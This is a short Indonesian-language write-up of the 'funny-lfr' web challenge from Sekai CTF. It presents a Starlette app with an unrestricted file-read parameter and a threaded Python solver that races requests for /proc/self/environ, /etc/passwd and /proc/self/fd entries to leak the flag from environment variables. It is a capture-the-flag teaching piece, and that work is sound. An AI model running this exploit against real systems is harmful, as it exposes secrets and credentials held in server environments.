# funny-lfr Writeup - Web - Sekai CTF

Pada challenge diatas kita dihadapkan dengan web app yang memungkinkan kita untuk membaca file yang kita tentukan melalui parameter `http://<url>/?file=<nama-file>`. dan goals pada challenge kali ini adalah membaca environtment dari mesin target, yang mana di dalam environtment tersebut terdapat flag yang tersimpan di env `$FLAG`.

## Source Code
```python
from starlette.applications import Starlette
from starlette.routing import Route
from starlette.responses import FileResponse, JSONResponse
from starlette.exceptions import HTTPException
import os

async def download(request):
    file_path = request.query_params.get("file")
    if not file_path:
        return JSONResponse({"error": "file parameter is missing"}, status_code=400)

    if not os.path.exists(file_path):
        return JSONResponse({"error": "file not found"}, status_code=404)

    return FileResponse(file_path)

app = Starlette(routes=[Route("/", endpoint=download)])
```
Tujuan kita adalah untuk membuka file `/proc/self/environ`, yang mana tidak bisa kita lakukan jika kita menuliskannya di parameter `file`,

kita bisa memanfaatkan `Race Condition` untuk membuka file tersebut, berikut merupakan kode solver untuk challenge diatas:

```python
import socket
import asyncio
from concurrent.futures import ThreadPoolExecutor

HOST = 'localhost'
PORT = 1337

class BaseAPI():
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port

    def visit(self, path):
        request = f"GET /?file={path} HTTP/1.1\r\nHost: {self.host}\r\nConnection: close\r\n\r\n"
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST,PORT))
            s.sendall(request.encode())
            response = []
            while True:
                data = s.recv(4096)
                if not data:
                    break
                response.append(data)
        return b"".join(response)

class API(BaseAPI):
    ...


def worker(api,path):
    res = api.visit(path)
    if b'SEKAI' in res:
        print(res)

async def main():
    api = API()
    paths = [
        "/proc/self/environ", "/etc/passwd", "/proc/self/fd/7",
        "/proc/self/fd/8", "/proc/self/fd/9", "/proc/self/fd/10",
        "/proc/self/fd/11", "/proc/self/fd/12",
    ]
    with ThreadPoolExecutor(max_workers=50) as executor:
        while True:
            futures = [executor.submit(worker, api, path) for _ in range(50) for path in paths]
            for future in futures:
                if future.result() is not None:
                    return
if __name__ == '__main__':
    asyncio.run(main())
```

Thankyou :)